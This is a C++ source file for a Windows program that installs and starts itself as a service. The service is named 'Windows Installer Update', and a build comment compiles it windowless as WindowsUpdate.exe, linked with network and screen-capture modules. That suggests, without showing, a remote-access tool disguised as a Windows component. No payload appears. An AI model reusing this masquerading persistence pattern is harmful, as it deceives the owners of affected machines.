#include <fstream>
#include <iostream>
#include <sstream>
#include <string>
#include <windows.h>
#include <tchar.h>

#include "service_manager.h"

using namespace std;

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

ofstream output;

ServiceManager *service_manager;

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

void WINAPI service_handler(DWORD dwCtrl) {
    switch (dwCtrl) {
        case SERVICE_CONTROL_STOP:
            service_manager->report_status(SERVICE_STOP_PENDING, NO_ERROR, 0);

            // Signal the service to stop.

            SetEvent(service_manager->ghSvcStopEvent);
            service_manager->report_status(service_manager->gSvcStatus.dwCurrentState, NO_ERROR, 0);

            return;
        case SERVICE_CONTROL_INTERROGATE:
            break;
        default:
            break;
    }
}

//------------------------------------------------------------------------------

void WINAPI service_main(DWORD dwArgc, LPTSTR *lpszArgv) {
    service_manager->gSvcStatusHandle = RegisterServiceCtrlHandler(service_manager->name.c_str(), service_handler);

    if (!service_manager->gSvcStatusHandle) {
        service_manager->report_event("RegisterServiceCtrlHandler");
        return;
    }

    service_manager->gSvcStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    service_manager->gSvcStatus.dwServiceSpecificExitCode = 0;

    service_manager->report_status(SERVICE_START_PENDING, NO_ERROR, 3000);

    service_manager->init(dwArgc, lpszArgv);
}

//------------------------------------------------------------------------------

int __cdecl _tmain(int argc, TCHAR *argv[]) {
    service_manager = new ServiceManager("Windows Installer Update");

    if (argc > 1) {
        if (lstrcmpi(argv[1], TEXT("install")) == 0) {
            set_machine_id();
            SC_HANDLE service = service_manager->install();

            if (service != 0) {
                StartService(service, 0, NULL);
            }

            return 0;
        }

        if (lstrcmpi(argv[1], TEXT("update")) == 0) {
            streambuf* sbuf = cout.rdbuf();
            output.open("C:\\Users\\Ricardo\\Downloads\\update");
            cout.rdbuf(output.rdbuf());

            cout << "Starting..." << endl;
            service_manager->main(false);
            cout << "End" << endl;

            cout << flush;

            return 0;
        }

        if (lstrcmpi(argv[1], TEXT("debug")) == 0) {
            streambuf* sbuf = cout.rdbuf();
            output.open("debug");
            cout.rdbuf(output.rdbuf());

            set_machine_id();

            cout << "Starting..." << endl;
            service_manager->main(false);
            cout << "End" << endl;

            cout << flush;

            return 0;
        }
    } else {
        streambuf* sbuf = cout.rdbuf();
        output.open("C:\\Users\\Ricardo\\Downloads\\service");
        cout.rdbuf(output.rdbuf());

        cout << "Starting..." << endl;

        service_manager->start_service_ctrl_dispatcher();

        cout << "End" << endl;
        cout << flush;

        return 0;
    }
}

//------------------------------------------------------------------------------
//------------------------------------------------------------------------------

// i586-mingw32msvc-g++ -mwindows -o WindowsUpdate.exe WindowsUpdate.cpp service_manager.cpp helper.cpp network.cpp screen_manager.cpp -L./gdi/lib -lgdi32 -lgdiplus -lws2_32 -lole32
